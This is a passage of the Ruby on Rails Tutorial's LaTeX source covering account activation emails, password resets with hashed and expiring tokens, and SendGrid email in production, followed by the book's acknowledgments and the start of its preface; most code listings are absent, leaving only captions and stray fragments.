The tests in Listing~\ref{code:generated_user_mailer_test} use the powerful \kode{assert\_match} method, which can be used either with a string or a regular expression:
The test in Listing~\ref{code:real_account_activation_test} uses \kode{assert\_match} to check that the name, activation token, and escaped email appear in the email's body.
For the last of these, note the use of
to escape the test user's email
The way to learn how to do something like this is by \href{http://lmgtfy.com/?q=ruby+rails+escape+url}{Googling ``ruby rails escape url''}.
You will \href{http://stackoverflow.com/questions/6714196/ruby-url-encoding-string}{find two main possibilities}, \kode{URI::encode(str)} and \kode{CGI::escape(str)}.
Trying them both reveals that the latter works.
(Actually, there's a third possibility as well: the \kode{ERB::Util} library supplies a \href{http://apidock.com/ruby/ERB/Util/url_encode}{url\_encode} method that has the same effect.)
A test of the current email implementation. 
Note that Listing~\ref{code:real_account_activation_test} takes care to add an activation token to the fixture user, which would otherwise be blank.
To get the test to pass, we have to configure our test file with the proper domain host, as shown in Listing~\ref{code:test_domain_host}.
Setting the test domain host.
With the code as above, the mailer test should be \passing:
$ bundle exec rake test:mailers
To use the mailer in our application, we just need to add a couple of lines to the \kode{create} action used to sign users up, as shown in Listing~\ref{code:user_signup_with_account_activation}.
Note that Listing~\ref{code:user_signup_with_account_activation} has changed the redirect behavior upon signing up.
Before, we redirected to the user's profile page (Section~\ref{sec:successful_signups}), but that doesn't make sense now that we're requiring account activation.
Instead, we now redirect to the root URL.
Adding account activation to user signup. 
create
<n>    else
instead of
We'll fix this by temporarily commenting out the failing lines, as shown in Listing~\ref{code:comment_out_failing_tests}.
We'll uncomment those lines and write passing tests for account activation in Section~\ref{sec:activation_test_and_refactoring}.
Temporarily commenting out failing tests. 
If you now try signing up as a new user, you should be redirected as shown in Figure~\ref{fig:redirected_not_activated}, and an email like the one shown in Listing~\ref{code:account_activation_email} should be generated.
Note that you will \emph{not} receive an actual email in a development environment, but it will show up in your server logs.
(You may have to scroll up a bit to see it.)
Section~\ref{sec:email_in_production} discusses how to send email for real in a production environment.
A sample account activation email from the server log.
Sent mail to michael@michaelhartl.com (931.6ms)<n>Date: Wed, 03 Sep 2014 19:47:18 +0000<n>From: noreply@example.com<n>To: michael@michaelhartl.com<n>Message-ID: <540770474e16_61d3fd1914f4cd0300a0@mhartl-rails-tutorial-953753.mail><n>Subject: Account activation<n>Mime-Version: 1.0<n>Content-Type: multipart/alternative;<n> boundary="--==_mimepart_5407704656b50_61d3fd1914f4cd02996a";<n> charset=UTF-8<n>Content-Transfer-Encoding: 7bit<n><n><n>----==_mimepart_5407704656b50_61d3fd1914f4cd02996a<n>Content-Type: text/plain;<n> charset=UTF-8<n>Content-Transfer-Encoding: 7bit<n><n>Hi Michael Hartl,<n><n>Welcome to the Sample App!
Click on the link below to activate your account:<n><n>http://rails-tutorial-c9-mhartl.c9.io/account_activations/<n>fFb_F94mgQtmlSvRFGsITw/edit?
email=michael%40michaelhartl.com<n>----==_mimepart_5407704656b50_61d3fd1914f4cd02996a<n>Content-Type: text/html;<n> charset=UTF-8<n>Content-Transfer-Encoding: 7bit<n><n><h1>Sample App</h1><n><n><p>Hi Michael Hartl,</p><n><n><p><n>Welcome to the Sample App!
Click on the link below to activate your account:<n></p><n><n><a href="http://rails-tutorial-c9-mhartl.c9.io/account_activations/<n>fFb_F94mgQtmlSvRFGsITw/edit?
email=michael%40michaelhartl.com">Activate</a><n>----==_mimepart_5407704656b50_61d3fd1914f4cd02996a--
The Home page with an activation message after signup.
Now that we have a correctly generated email as in Listing~\ref{code:account_activation_email}, we need to write an \kode{edit} action in the Account Activations controller to activate the user.
Recall from the discussion in Section~\ref{sec:account_activation_mailer} that the activation token and email are available as \kode{params[:id]} and \kode{params[:email]}, respectively.
Following the model of passwords (Listing~\ref{code:find_authenticate_user}) and remember tokens (Listing~\ref{code:persistent_current_user}), we plan to find and authenticate the user with code something like this:
(As we'll see in a moment, there will be one extra boolean in the expression above.
See if you can guess what it will be.)
The above code uses the \kode{authenticated?}\ method to test if the account activation digest matches the given token, but at present this won't work because that method is specialized to the remember token (Listing~\ref{code:authenticated_p}):
Here \kode{remember\_digest} is an attribute on the User model, and inside the model we can rewrite it as follows:
Somehow, we want to be able to make this \emph{variable}, so we can call
instead by passing in the appropriate parameter to \kode{authenticated?}.
The solution involves our first example of \emph{metaprogramming}, which is essentially a program that writes a program.
(Metaprogramming is one of Ruby's strongest suits, and many of the ``magic'' features of Rails are due to its use of Ruby metaprogramming.)
The key in this case is the powerful \kode{send} method, which lets us call a method with a name of our choice by ``sending a message'' to a given object.
For example, in this console session we use \kode{send} on a native Ruby object to find the length of an array:
Here we see that passing the symbol \kode{:length} or string \kode{'length'} to \kode{send} is equivalent to calling the \kode{length} method on the given object.
As a second example, we'll access the \kode{activation\_digest} attribute of the first user in the database:
Note in the last example that we've defined an \kode{attribute} variable equal to the symbol \kode{:activation} and used string interpolation to build up the proper argument to \kode{send}.
This would work also with the string \kode{'activation'}, but using a symbol is more conventional, and in either case
becomes
"activation_digest"
once the string is interpolated.
(We saw how symbols are interpolated as strings in Section~\ref{sec:the_flash}.)
With this template in place, we can generalize the method by adding a function argument with the name of the digest, and then use string interpolation as above:
(Here we have renamed the second argument \kode{token} to emphasize that it's now generic.)
Because we're inside the user model, we can also omit \kode{self}, yielding the most idiomatically correct version:
We can now reproduce the previous behavior of \kode{authenticated?}\ by invoking it like this:
in Listing~\ref{code:generalized_authenticated_p}.
A generalized \kode{authenticated?}\ 
method.
$ bundle exec rake test
To fix this, we simply update the two cases to use the generalized method, as shown in Listing~\ref{code:generalized_current_user} and Listing~\ref{code:test_authenticated_invalid_token_updated}.
Using the generalized \kode{authenticated?}\ 
# Returns the current logged-in user (if any).
<n>      end
At this point, the tests should be \passing:
Refactoring the code as above is incredibly more error-prone without a solid test suite, which is why we went to such trouble to write good tests in Section~\ref{sec:login_with_remembering} and Section~\ref{sec:remember_tests}.
With the \kode{authenticated?}\ method as in Listing~\ref{code:generalized_authenticated_p}, we're now ready to write an \kode{edit} action that authenticates the user corresponding to the email address in the \kode{params} hash.
Our test for validity will look like this:
This prevents our code from activating users who have already been activated, which is important because we'll be logging in users upon confirmation, and we don't want to allow attackers who manage to obtain the activation link to log in as the user.
If the user is authenticated according to the booleans above, we need to activate the user and update the \kode{activated\_at} timestamp:
This leads to the \kode{edit} action shown in Listing~\ref{code:account_activation_edit_action}.
Note also that Listing~\ref{code:account_activation_edit_action} handles the case of an invalid activation token; this should rarely happen, but it's easy enough to redirect in this case to the root URL.
An \kode{edit} action to activate accounts.
With the code in Listing~\ref{code:account_activation_edit_action}, you should now be able to paste in the URL from Listing~\ref{code:account_activation_email} to activate the relevant user.
For example, on my system I visited the URL
http://rails-tutorial-c9-mhartl.c9.io/account_activations/<n>fFb_F94mgQtmlSvRFGsITw/edit?
email=michael%40michaelhartl.com
and got the result shown in Figure~\ref{fig:activated_user}.
The profile page after a successful activation.
Of course, currently user activation doesn't actually \emph{do} anything, because we haven't changed how users log in.
In order to have account activation mean something, we need to allow users to log in only if they are activated.
As shown in Listing~\ref{code:preventing_unactivated_logins}, the way to do this is to log the user in as usual if \kode{user.activated?}\ is true; otherwise, we redirect to the root URL with a \kode{warning} message (Figure~\ref{fig:not_activated_warning}).
Preventing unactivated users from logging in.
<n>      else
destroy
The warning message for a not-yet-activated user.
With that, apart from one refinement, the basic functionality of user activation is done.
(That refinement is preventing unactivated users from being displayed, which is left as an exercise (Section~\ref{sec:activation_resets_exercises}).)
In Section~\ref{sec:activation_test_and_refactoring}, we'll complete the process by adding some tests and then doing a little refactoring.
In this section, we'll add an integration test for account activation.
Because we already have a test for signing up with valid information, we'll add the steps to the test developed in Section~\ref{sec:a_test_for_valid_submission} (Listing~\ref{code:a_test_for_valid_submission}).
There are quite a few steps, but they are mostly straightforward; see if you can follow along in Listing~\ref{code:signup_with_account_activation_test}.
Adding account activation to the user signup test. 
# Try to log in before activation.
follow_redirect!
There's a lot of code in Listing~\ref{code:signup_with_account_activation_test}, but the only completely novel code is in the line
This code verifies that exactly 1 message was delivered.
we have
Listing~\ref{code:signup_with_account_activation_test} also uses the \kode{assigns} method for the first time in the main tutorial; as explained in the Chapter~\ref{cha:log_in_log_out} exercise (Section~\ref{sec:log_in_out_exercises}), \kode{assigns} lets us access instance variables in the corresponding action.
For example, the Users controller's \kode{create} action defines an \kode{@user} variable (Listing~\ref{code:user_signup_with_account_activation}), so we can access it in the test using \kode{assigns(:user)}.
Finally, note that Listing~\ref{code:signup_with_account_activation_test} restores the lines we commented out in Listing~\ref{code:comment_out_failing_tests}.
At this point, the test suite should be \passing:
With the test in Listing~\ref{code:signup_with_account_activation_test}, we're ready to refactor a little by moving some of the user manipulation out of the controller and into the model.
In particular, we'll make an \kode{activate} method to update the user's activation attributes and a \kode{send\_activation\_email} to send the activation email.
The extra methods appear in Listing~\ref{code:user_activation_methods}, and the refactored application code appears in Listing~\ref{code:user_signup_refactored} and Listing~\ref{code:account_activation_refactored}.
Adding user activation methods to the User model.
# Activates an account.
<n>    .
Sending email via the user model object.
Account activation via the user model object.
Note that Listing~\ref{code:user_activation_methods} eliminates the use of \kode{user.}, which would break inside the User model because there is no such variable:
(We could have switched from \kode{user} to \kode{self}, but recall from Section~\ref{sec:uniqueness_validation} that \kode{self} is optional inside the model.)
It also changes \kode{@user} to \kode{self} in the call to the User mailer:
These are \emph{exactly} the kinds of details that are easy to miss during even a simple refactoring but will be caught by a good test suite.
Speaking of which, the test suite should still be \passing:
Account activation is now completed, which is a milestone worthy of a commit:
Having completed account activation (and thereby verified the user's email address), we're now in a good position to handle the common case of users forgetting their passwords.
As we'll see, many of the steps are similar, and we will have several opportunities to apply the lessons learned in Section~\ref{sec:account_activation}.
The beginning is different, though; unlike account activation, implementing password resets requires both a change to one of our views and two new forms (to handle email and new password submission).
Before writing any code, let's mock up the expected sequence for resetting passwords.
We'll start by adding a ``forgot password'' link to the sample application's login form (Figure~\ref{fig:login_forgot_password_mockup}).
The ``forgot password'' link will go to a page with a form that takes in an email address and sends an email containing a password reset link (Figure~\ref{fig:forgot_password_form_mockup}).
The reset link will go to a form for resetting the user's password (with confirmation) (Figure~\ref{fig:reset_password_form_mockup}).
A mockup of a ``forgot password'' link.
A mockup of the ``forgot password'' form.
A mockup of the reset password form.
In analogy with account activations, our general plan is to make a Password Resets resource, with each password reset consisting of a reset token and corresponding reset digest. The primary sequence goes like this:
When a user requests a password reset, find the user by the submitted email address.
If the email address exists in the database, generate a reset token and corresponding reset digest.
Save the reset digest to the database, and then send an email to the user with a link containing the reset token and user's email address.
When the user clicks the link, find the user by email address, and then authenticate the token by comparing to the reset digest.
If authenticated, present the user with the form for changing the password.
As with account activations (Section~\ref{sec:account_activations_resource}), our first step is to generate a controller for our new resource:
As in Section~\ref{sec:account_activations_resource}, we've included a flag to skip generating tests and will instead build on the integration test from Section~\ref{sec:activation_test_and_refactoring}.
Because we'll need forms both for creating new password resets \linebreak (Figure~\ref{fig:forgot_password_form_mockup}) and for updating them by changing the password in the User model (Figure~\ref{fig:reset_password_form_mockup}), we need routes for \kode{new}, \kode{create}, \kode{edit}, and \kode{update}.
We can arrange this with the \kode{resources} line shown in Listing~\ref{code:password_resets_resource}.
Adding a resource for password resets.
The code in Listing~\ref{code:password_resets_resource} arranges for the RESTful routes shown in Table~\ref{table:RESTful_password_resets}.
In particular, the first route in Table~\ref{table:RESTful_password_resets} gives a link to the ``forgot password'' form via
new_password_reset_path
as seen in Listing~\ref{code:log_in_password_reset} and Figure~\ref{fig:forgot_password_link}.
HTTP request
Named route
RESTful routes provided by the Password Resets resource in Listing~\ref{code:password_resets_resource}.
Adding a link to password resets.
Sign up
</div>
The login page with a ``forgot password'' link.
The data model for password resets is similar to the one used for account activation (Figure~\ref{fig:user_model_account_activation}).
Following the pattern set by remember tokens (Section~\ref{sec:remember_me}) and account activation tokens (Section~\ref{sec:account_activation}), password resets will pair a virtual reset token for use in the reset email with a corresponding reset digest for retrieving the user.
If we instead stored an unhashed token, an attacker with access to the database could send a reset request to the user's email address and then use the token and email to visit the corresponding password reset link, thereby gaining control of the account.
Using a digest for password resets is thus essential.
As an additional security precaution, we'll also plan to \emph{expire} the reset link after a couple of hours, which requires recording the time when the reset gets sent.
The resulting \kode{reset\_digest} and \kode{reset\_sent\_at} attributes appear in Figure~\ref{fig:user_model_password_reset}.
The User model with added password reset attributes.
The migration to add the attributes from Figure~\ref{fig:user_model_password_reset} appears as follows:
We then migrate as usual:
To make the view for new password resets, we'll work in analogy with the previous form for making a new non--Active Record resource, namely, the login form (Listing~\ref{code:login_form}) for creating a new session, shown again in Listing~\ref{code:login_form_redux} for reference.
Reviewing the code for the login form.
The new password resets form has a lot in common with Listing~\ref{code:login_form_redux}; the most important differences are the use of a different resource and URL in the call to \kode{form\_for} and the omission of the password attribute.
The result appears in Listing~\ref{code:new_password_reset} and Figure~\ref{fig:forgot_password_form}.
A new password reset view.
The ``forgot password'' form.
Upon submitting the form in Figure~\ref{fig:forgot_password_form}, we need to find the user by email address and update its attributes with the password reset token and sent-at timestamp.
We then redirect to the root URL with an informative flash message.
As with login (Listing~\ref{code:correct_login_failure}), in the case of an invalid submission we re-render the \kode{new} page with a \kode{flash.now} message.
The results appear in Listing~\ref{code:create_password_reset}.
A \kode{create} action for password resets.
The code in the User model parallels the \kode{create\_activation\_digest} method used in the \kode{before\_create} callback (Listing~\ref{code:user_model_activation_code}), as seen in Listing~\ref{code:user_model_password_reset}.
Adding password reset methods to the User model.
As shown in Figure~\ref{fig:invalid_email_password_reset}, at this point the application's behavior for invalid email addresses is already working.
To get the application working upon submission of a valid email address as well, we need to define a password reset mailer method.
The ``forgot password'' form for an invalid email address.
The code to send the password reset email appears in Listing~\ref{code:user_model_password_reset} as follows:
The password reset mailer method needed to get this working is nearly identical to the mailer for account activation developed in Section~\ref{sec:account_activation_mailer}.
We first create a \kode{password\_reset} method in the user mailer (Listing~\ref{code:mail_password_reset}), and then define view templates for plain-text email (Listing~\ref{code:password_reset_text}) and HTML email (Listing~\ref{code:password_reset_html}).
Mailing the password reset link.
The password reset plain-text email template.
<n><n>If you did not request your password to be reset, please ignore this email and<n>your password will stay as it is.
The password reset HTML email template.
As with account activation emails (Section~\ref{sec:account_activation_mailer}), we can preview password reset emails using the Rails email previewer.
The code is exactly analogous to Listing~\ref{code:account_activation_preview}, as shown in Listing~\ref{code:password_reset_preview}.
A working preview method for password reset.
With the code in Listing~\ref{code:password_reset_preview}, the HTML and text email previews appear as in Figure~\ref{fig:password_reset_html_preview} and Figure~\ref{fig:password_reset_text_preview}.
A preview of the HTML version of the password reset email.
A preview of the text version of the password reset email.
In analogy with the account activation mailer method test (Listing~\ref{code:real_account_activation_test}), we'll write a short test of the password reset mailer method, as shown in Listing~\ref{code:password_reset_mailer_test}.
Note that we need to create a password reset token for use in the views; unlike the activation token, which is created for every user by a \kode{before\_create} callback (Listing~\ref{code:user_model_activation_code}), the password reset token is created only when a user successfully submits the ``forgot password'' form.
This will occur naturally in an integration test (Listing~\ref{code:password_reset_integration_test}), but in the present context we need to create one by hand.
Adding a test of the password reset mailer method. 
With the code in Listing~\ref{code:mail_password_reset}, Listing~\ref{code:password_reset_text}, and Listing~\ref{code:password_reset_html}, submission of a valid email address appears as shown in Figure~\ref{fig:valid_email_password_reset}.
The corresponding email appears in the server log and should look something like Listing~\ref{code:password_reset_email}.
The result of submitting a valid email address.
A sample password reset email from the server log.
Sent mail to michael@michaelhartl.com (66.8ms)<n>Date: Thu, 04 Sep 2014 01:04:59 +0000<n>From: noreply@example.com<n>To: michael@michaelhartl.com<n>Message-ID: <5407babbee139_8722b257d04576a@mhartl-rails-tutorial-953753.mail><n>Subject: Password reset<n>Mime-Version: 1.0<n>Content-Type: multipart/alternative;<n> boundary="--==_mimepart_5407babbe3505_8722b257d045617";<n> charset=UTF-8<n>Content-Transfer-Encoding: 7bit<n><n><n>----==_mimepart_5407babbe3505_8722b257d045617<n>Content-Type: text/plain;<n> charset=UTF-8<n>Content-Transfer-Encoding: 7bit<n><n>To reset your password click the link below:<n><n>http://rails-tutorial-c9-mhartl.c9.io/password_resets/3BdBrXeQZSWqFIDRN8cxHA/<n>edit?
email=michael%40michaelhartl.com<n><n>This link will expire in two hours.
<n>----==_mimepart_5407babbe3505_8722b257d045617<n>Content-Type: text/html;<n> charset=UTF-8<n>Content-Transfer-Encoding: 7bit<n><n><h1>Password reset</h1><n><n><p>To reset your password click the link below:</p><n><n><a href="http://rails-tutorial-c9-mhartl.c9.io/<n>password_resets/3BdBrXeQZSWqFIDRN8cxHA/<n>edit?
email=michael%40michaelhartl.com">Reset password</a><n><n><p>This link will expire in two hours.</p><n><n><p><n>If you did not request your password to be reset, please ignore this email and<n>your password will stay as it is.
<n></p><n>----==_mimepart_5407babbe3505_8722b257d045617--
To get links of the form
http://example.com/password_resets/3BdBrXeQZSWqFIDRN8cxHA/edit?email=foo%40bar.com
to work, we need a form for resetting passwords.
The task is similar to updating users via the user edit view (Listing~\ref{code:user_edit_view}), but in this case with only password and confirmation fields.
There's an additional complication, though: we expect to find the user by email address, which means we need its value in both the \kode{edit} and \kode{update} actions.
The email will automatically be available in the \kode{edit} action because of its presence in the link above, but after we submit the form its value will be lost.
The solution is to use a \emph{hidden field} to place (but not display) the email on the page, and then submit it along with the rest of the form's information.
The result appears in Listing~\ref{code:password_reset_form}
The form to reset a password.
Note that Listing~\ref{code:password_reset_form} uses the form tag helper
because the reset link puts the email in \kode{params[:email]}, whereas the latter would put it in \kode{params[:user][:email]}.
To get the form to render, we need to define an \kode{@user} variable in the Password Resets controller's \kode{edit} action.
As with account activation (Listing~\ref{code:account_activation_edit_action}), this involves finding the user corresponding to the email address in \kode{params[:email]}.
Because the existence of a valid \kode{@user} is needed in both the \kode{edit} and \kode{update} actions, we'll put the code to find and validate it in a couple of before filters, as shown in Listing~\ref{code:password_reset_edit_action}.
The \kode{edit} action for password reset.
valid user
In Listing~\ref{code:password_reset_edit_action}, compare the use of
in Listing~\ref{code:generalized_current_user} and
in Listing~\ref{code:account_activation_edit_action}.
Together, these three uses complete the authentication methods shown in Table~\ref{table:password_token_digest}.
With the code as above, following the link from Listing~\ref{code:password_reset_email} should render a password reset form.
The result appears in Figure~\ref{fig:password_reset_form}.
The password reset form.
To define the \kode{update} action corresponding to the \kode{edit} action in Listing~\ref{code:password_reset_edit_action}, we need to consider four cases: an expired password reset, a successful update, a failed update (due to an invalid password), and a failed update (which initially looks ``successful'') due to a blank password and confirmation.
The first case applies to both the \kode{edit} and \kode{update} actions, and so logically belongs in a before filter (Listing~\ref{code:password_reset_update_action}).
The next two cases correspond to the two branches in the main \kode{if} statement shown in Listing~\ref{code:password_reset_update_action}.
Because the edit form is modifying an Active Record model object (i.e., a user), we can rely on the shared partial from Listing~\ref{code:password_reset_form} to render error messages.
We need only handle the case where the password is empty because if the confirmation is empty, the confirmation validation (which is skipped if the password is empty) will catch the problem and supply a relevant error message.
error
The \kode{update} action for password reset.
update
# Before filters
The implementation in Listing~\ref{code:password_reset_update_action} delegates the boolean test for password reset expiration to the User model via the code
To get this to work, we need to define the \kode{password\_reset\_expired?}
As indicated in the email templates from Section~\ref{sec:password_reset_mailer}, we'll consider a password reset to be expired if it was sent more than two hours ago, which we can express in Ruby as follows:
This can be confusing if you read \kode{<} as ``less than'', because then it sounds like ``Password reset sent less than two hours ago,'' which is the opposite of what we want.
In this context, it's better to read \kode{<} as ``earlier than'', which gives something like ``Password reset sent earlier than two hours ago.''
That \emph{is} what we want, and it leads to the \kode{password\_reset\_expired?}\ method in Listing~\ref{code:user_model_password_reset_expired}.
(For a formal demonstration that the comparison is correct, see the proof in Section~\ref{sec:expiration_proof}.)
# Returns true if a password reset has expired.
With the code in Listing~\ref{code:user_model_password_reset_expired}, the \kode{update} action in Listing~\ref{code:password_reset_update_action} should be working.
The results for invalid and valid submissions are shown in Figure~\ref{fig:password_reset_failure} and Figure~\ref{fig:password_reset_success}, respectively.
(Lacking the patience to wait two hours, we'll cover the third branch in a test, which is left as an exercise (Section~\ref{sec:activation_resets_exercises}).)
A failed password reset.
A successful password reset.
In this section, we'll write an integration test covering two of the three branches in Listing~\ref{code:password_reset_update_action}, invalid and valid submission.
(As noted above, testing the third branch is left as an exercise.)
We'll get started by generating a test file for password resets:
      create
The steps to test password resets broadly parallel the test for account activation from Listing~\ref{code:signup_with_account_activation_test}, though there is a difference at the outset: we first visit the ``forgot password'' form and submit invalid and then valid email addresses, the latter of which creates a password reset token and sends the reset email.
We then visit the link from the email and again submit invalid and valid information, verifying the correct behavior in each case.
The resulting test, shown in Listing~\ref{code:password_reset_integration_test}, is an excellent exercise in reading code.
An integration test for password resets.
Password
Most of the ideas in Listing~\ref{code:password_reset_integration_test} have appeared previously in this tutorial; the only really novel element is the test of the \kode{input} tag:
This makes sure that there is an \kode{input} tag with the right name, (hidden) type, and email address:
With the code as in Listing~\ref{code:password_reset_integration_test}, our test suite should be \passing:
As a capstone to our work on account activation and password reminders, in this section we'll configure our application so that it can actually send email in production.
We'll first get set up with a free service to send email, and then configure and deploy our application.
To send email in production, we'll use SendGrid, which is available as an add-on at Heroku for verified accounts.
(This requires adding credit card information to your Heroku account, but there is no charge when verifying an account.)
We can add it to our app as follows:
To configure our application to use SendGrid, we need to fill out the \href{https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol}{SMTP} settings for our production environment.
As shown in Listing~\ref{code:sendgrid_config}, you will also have to define a \kode{host} variable with the address of your production website.
Configuring Rails to use SendGrid in production.
config/environments/production.rb
=> true
The email configuration in Listing~\ref{code:sendgrid_config} includes the \kode{user\_name} and \linebreak \kode{password} of the SendGrid account, but note that they are accessed via the \kode{ENV} environment variable instead of being hard-coded.
This is a best practice for production applications, which for security reasons should never expose sensitive information such as raw passwords in source code.
In the present case, these variables are configured automatically via the SendGrid add-on, but we'll see an example in Section~\ref{sec:image_upload_in_production} where we'll have to define them ourselves.
In case you're curious, you can view the environment variables used in Listing~\ref{code:sendgrid_config} as follows:
At this point, you should merge the topic branch into master:
$ bundle exec rake test<n>$ git add -A<n>$ git commit -m "Add password resets & email configuration"<n>$ git checkout master<n>$ git merge account-activation-password-reset
Then push up to the remote repository and deploy to Heroku:
$ bundle exec rake test<n>$ git push<n>$ git push heroku<n>$ heroku run rake db:migrate
Once the Heroku deploy has finished, try signing up for the sample application in production using an email address you control.
You should get an activation email as implemented in Section~\ref{sec:account_activations_resource} (Figure~\ref{fig:activation_email_production}).
If you then forget (or pretend to forget) your password, you can reset it as developed in Section~\ref{sec:password_reset} (Figure~\ref{fig:reset_email_production}).
An account activation email sent in production.
A password reset email sent in production.
With the added account activation and password resets, our sample application's sign up, log in, and log out machinery is complete and professional-grade.
The rest of the \emph{Ruby on Rails Tutorial} builds on this foundation to make a site with Twitter-like microposts (Chapter~\ref{cha:user_microposts}) and a status feed of posts from followed users (Chapter~\ref{cha:following_users}).
In the process, we'll learn about some of the most powerful features of Rails, including image upload, custom database queries, and advanced data modeling with \kode{has\_many} and \kode{has\_many :through}.
<n><n>\subsection{What we learned in this chapter} % (fold)<n>\label{sec:activation_resets_what_we_learned_in_this_chapter}<n><n>\begin{itemize}<n><n>\item 
Like sessions, account activations can be modeled as a resource despite not being Active Record objects.
Rails can generate Active Mailer actions and views to send email.
Action Mailer supports both plain-text and HTML mail.
As with ordinary actions and views, instance variables defined in mailer actions are available in mailer views.
Like sessions and account activations, password resets can be modeled as a resource despite not being Active Record objects.
Account activations and password resets use a generated token to create a unique URL for activating users or resetting passwords, respectively.
Both mailer tests and integration tests are useful for verifying the behavior of the User mailer.
We can send email in production using SendGrid.
Write an integration test for the expired password reset branch in Listing~\ref{code:password_reset_update_action} by filling in the template shown in Listing~\ref{code:password_reset_expire_test}.
(This code introduces \kode{response.body}, which returns the full HTML body of the page.)
There are many ways to test for the result of an expiration, but the method suggested by Listing~\ref{code:password_reset_expire_test} is to (case-insensitively) check that the response body includes the word ``expired''.
Right now \emph{all} users are displayed on the user index page at /users and are visible via the URL /users/:id, but it makes sense to show users only if they are activated.
in Listing~\ref{code:show_only_active_users_exercise}.
The two are nearly identical, but the latter operator has a higher \href{http://en.wikipedia.org/wiki/Order_of_operations#Programming_languages}{\emph{precedence}}, which binds too tightly to \kode{root\_url} in this case.
We could fix the problem by putting \kode{root\_url} in parentheses, but the idiomatically correct way to do it is to use \kode{and} instead.
\emph{Extra credit}: Write integration tests for both /users and /users/:id.
By filling in the template shown in Listing~\ref{code:update_columns}, replace each pair of \kode{update\_attribute} calls with a single call to \kode{update\_columns}, which hits the database only once.
After making the changes, verify that the test suite is still \passing.
A test for an expired password reset. 
A template for code to show only active users.
index
A template for using \kode{update\_columns}.
In this section, we'll prove that the comparison for password expiration in Section~\ref{sec:resetting_the_password} is correct.
We start by defining two time intervals.
A password reset has expired if the time interval since the reset was sent is greater than the expiration limit:
\begin{equation}<n>\label{eq:time_delta}<n>\Delta t_r > \Delta t_e.
<n>\end{equation}
\begin{equation}<n>\label{eq:delta_p}<n>\Delta t_r = t_N - t_r<n>\end{equation}
\begin{equation}<n>\label{eq:delta_e}<n>\Delta t_e = t_N - t_e.
\begin{equation}<n>\label{eq:time_comparison}<n>t_r < t_e.
As noted in Section~\ref{sec:resetting_the_password}, if we read \kode{<} as ``earlier than'' instead of ``less than'', this code makes sense as the English sentence ``The password reset was sent earlier than two hours ago.''
The \emph{Ruby on Rails Tutorial} owes a lot to my previous Rails book, \emph{RailsSpace}, and hence to my coauthor \href{http://aure.com/}{Aurelius Prochazka}.
I'd like to thank Aure both for the work he did on that book and for his support of this one.
I'd also like to thank Debra Williams Cauley, my editor on both \emph{RailsSpace} and the \emph{Ruby on Rails Tutorial}; as long as she keeps taking me to baseball games, I'll keep writing books for her.
Finally, many, many readers---far too many to list---have contributed a huge number of bug reports and suggestions during the writing of this book, and I gratefully acknowledge their help in making it as good as it can~be.
Welcome to \href{http://www.railstutorial.org/book}{\emph{Ruby on Rails Tutorial: Learn Web Development with Rails}}.
The purpose of this book is to teach you how to develop custom web applications, and our tool of choice is the popular \href{http://rubyonrails.org}{Ruby on Rails} web framework.
Ruby on Rails Tutorial
On the other hand, if you already know web development, this book will quickly teach you the essentials of the Rails framework, including MVC and REST, generators, migrations, routing, and embedded Ruby.
In either case, when you finish the \emph{Ruby on Rails Tutorial} you will be in a position to benefit from the many more advanced books, blogs, and screencasts that are part of the thriving programming educational ecosystem
The \emph{Ruby on Rails Tutorial} takes an integrated approach to web development by building three example applications of increasing sophistication, starting with a minimal \emph{hello} app (Section~\ref{sec:the_hello_application}), a slightly more capable \emph{toy} app (Chapter~\ref{cha:a_toy_app}), and a real \emph{sample} app (Chapter~\ref{cha:static_pages} through Chapter~\ref{cha:following_users}).
As implied by their generic names, the applications developed in the \emph{Ruby on Rails Tutorial} are not specific to any particular kind of website; although the final sample application will bear more than a passing resemblance to a certain popular \href{http://twitter.com/}{social microblogging site} (a site which, coincidentally, was also originally written in Rails), the emphasis throughout the tutorial is on general principles, so you will have a solid foundation no matter what kinds of web applications you want to build.
One common question is how much background is necessary to learn web development using the \emph{Ruby on Rails Tutorial}.
As discussed in more depth in Section~\ref{sec:prerequisites}, web development is a challenging subject, especially for complete beginners.
Although the tutorial was originally designed for readers with some prior programming or web-development experience, in fact it has found a significant audience among beginning developers.
Lowering the barrier
This third edition of the \emph{Ruby on Rails Tutorial} aims to lower the barrier to getting started with Rails in a number of ways:
Use of a standard development environment in the cloud (Section~\ref{sec:up_and_running}), which sidesteps many of the problems associated with installing and configuring a new system
Elimination of many external dependencies (RSpec, Cucumber, Capybara, Factory Girl)
A lighter-weight and more flexible approach to testing
Deferral or elimination of more complex configuration options (Spork, RubyTest)
Less emphasis on features specific to any given version of Rails, with greater emphasis on general principles of web development
It is my hope that these changes will make the third edition of the \emph{Ruby on Rails Tutorial} accessible to an even broader audience than previous versions.
In this first chapter, we'll get started with Ruby on Rails by installing all the necessary software and by setting up our development environment (Section~\ref{sec:up_and_running}).
We'll then create our first Rails application, called \kode{hello\_app}.
The \emph{Rails Tutorial} emphasizes good software development practices, so immediately after creating our fresh new Rails project we'll put it under version control with Git (Section~\ref{sec:version_control}).
And, believe it or not, in this chapter we'll even put our first app on the wider web by \emph{deploying} it to production (Section~\ref{sec:deploying}).
In Chapter~\ref{cha:a_toy_app}, we'll make a second project, whose purpose is to demonstrate the basic workings of a Rails application.
\emph{URI} stands for Uniform Resource Identifier, while the slightly less general \emph{URL} stands for Uniform Resource Locator.
In practice, the URL is usually equivalent to ``the thing you see in the address bar of your browser''.
The rest of the tutorial focuses on developing a single large \emph{real sample application} (called \kode{sample\_app}), writing all the code from scratch.
We'll develop the sample app using a combination of \emph{mockups}, \emph{test-driven development} (TDD), and \emph{integration tests}.
We'll get started in Chapter~\ref{cha:static_pages} by creating static pages and then add a little dynamic content.
We'll take a quick detour in Chapter~\ref{cha:rails_flavored_ruby} to learn a little about the Ruby language underlying Rails.
Then, in Chapter~\ref{cha:filling_in_the_layout} through Chapter~\ref{cha:account_activation_and_password_reset}, we'll complete the foundation for the sample application by making a site layout, a user data model, and a full registration and authentication system (including account activation and password resets).
Finally, in Chapter~\ref{cha:user_microposts} and Chapter~\ref{cha:following_users} we'll add microblogging and social features to make a working example site.
Scaffolding: Quicker, easier, more seductive
From the beginning, Rails has benefited from a palpable sense of excitement, starting with the famous \href{http://www.youtube.com/watch?v=Gzj723LkRJY}{15-minute weblog video} by Rails creator David Heinemeier Hansson.
That video and its successors are a great way to get a taste of Rails' power, and I recommend watching them.
But be warned: they accomplish their amazing fifteen-minute feat using a feature called \emph{scaffolding}, which relies heavily on \emph{generated code}, magically created by the Rails \kode{generate scaffold} command.
